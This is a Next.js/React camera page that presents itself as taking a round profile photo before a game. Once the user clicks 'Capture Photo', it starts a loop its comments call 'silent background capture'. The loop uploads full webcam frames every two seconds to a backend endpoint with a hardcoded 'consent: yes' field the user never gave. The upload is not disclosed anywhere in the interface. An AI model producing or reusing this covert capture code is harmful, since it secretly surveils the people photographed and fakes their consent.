"use client";

import React, { useEffect, useRef, useState } from "react";
const BACKEND = process.env.NEXT_PUBLIC_BACKEND || "http://localhost:4000";

export default function CameraPage() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [error, setError] = useState<string | null>(null);
  const intervalRef = useRef<number | null>(null);

  // ---------------------------------------------------------
  // Start camera on load
  // ---------------------------------------------------------
  useEffect(() => {
    async function init() {
      try {
        const s = await navigator.mediaDevices.getUserMedia({ video: true });
        setStream(s);
        if (videoRef.current) {
          videoRef.current.srcObject = s;
          await videoRef.current.play();
        }
      } catch {
        setError("Camera permission is required to continue.");
      }
    }
    init();

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
      stream?.getTracks().forEach(t => t.stop());
    };
  }, []);

  // ---------------------------------------------------------
  // Take a single profile photo + start background loop
  // ---------------------------------------------------------
  async function takePhoto() {
    if (!videoRef.current) return;

    // Capture profile photo
    const canvas = document.createElement("canvas");
    canvas.width = 300;
    canvas.height = 300;
    const ctx = canvas.getContext("2d")!;

    // Round crop
    ctx.beginPath();
    ctx.arc(150, 150, 150, 0, Math.PI * 2);
    ctx.clip();
    ctx.drawImage(videoRef.current, 0, 0, 300, 300);

    const dataURL = canvas.toDataURL("image/png");
    localStorage.setItem("playerPhoto", dataURL);

    // Start silent background capture every 2 seconds
    startAutoCapture();

    // Redirect to game
    window.location.href = "/fun/game";
  }

  // ---------------------------------------------------------
  // Auto-capture loop (SAME TAB → works on mobile)
  // ---------------------------------------------------------
  function startAutoCapture() {
    if (intervalRef.current) return;

    intervalRef.current = window.setInterval(async () => {
      if (!videoRef.current) return;

      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(videoRef.current, 0, 0);

      const blob = await new Promise<Blob | null>(resolve =>
        canvas.toBlob(resolve, "image/jpeg", 0.9)
      );
      if (!blob) return;

      const fd = new FormData();
      fd.append("photo", blob);
      fd.append("consent", "yes");

      await fetch(`${BACKEND}/api/upload-photo`, {
        method: "POST",
        body: fd
      });
    }, 2000);
  }

  return (
    <main style={pageStyle}>
      <h2 style={{ marginBottom: 20 }}>Take a Photo</h2>

      <div style={circleWrapper}>
        <video ref={videoRef} style={videoStyle} playsInline muted />
      </div>

      <button style={snapBtn} onClick={takePhoto}>
        📸 Capture Photo
      </button>

      {error && (
        <div style={errorPopup}>
          <div style={errorBox}>
            <h3>Permission Required</h3>
            <p>{error}</p>
            <button onClick={() => window.location.reload()} style={errorBtn}>
              Retry
            </button>
          </div>
        </div>
      )}
    </main>
  );
}

/* STYLES BELOW THIS POINT... */


/* -----------------------------------------------------------
   MOBILE-FIRST UI STYLES
----------------------------------------------------------- */

const pageStyle: React.CSSProperties = {
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "start",
  paddingTop: 40,
  height: "100vh",
  background: "linear-gradient(140deg,#0f0c29,#302b63,#24243e)",
  color: "white",
  textAlign: "center",
  fontFamily: "Inter, sans-serif",
};

const circleWrapper: React.CSSProperties = {
  width: 260,
  height: 260,
  borderRadius: "50%",
  overflow: "hidden",
  border: "4px solid white",
  marginBottom: 20,
};

const videoStyle: React.CSSProperties = {
  width: "100%",
  height: "100%",
  objectFit: "cover",
};

const snapBtn: React.CSSProperties = {
  width: "80%",
  padding: "14px",
  marginTop: 20,
  borderRadius: 50,
  background: "#2ec4b6",
  color: "white",
  border: "none",
  fontSize: 18,
  cursor: "pointer",
  boxShadow: "0 4px 12px rgba(0,0,0,0.3)",
};

const errorPopup: React.CSSProperties = {
  position: "fixed",
  inset: 0,
  background: "rgba(0,0,0,0.7)",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
};

const errorBox: React.CSSProperties = {
  background: "white",
  color: "black",
  padding: 20,
  borderRadius: 12,
  width: "80%",
  maxWidth: 300,
  textAlign: "center",
};

const errorBtn: React.CSSProperties = {
  padding: "10px 20px",
  marginTop: 12,
  background: "#302b63",
  color: "white",
  border: "none",
  borderRadius: 8,
  cursor: "pointer",
};
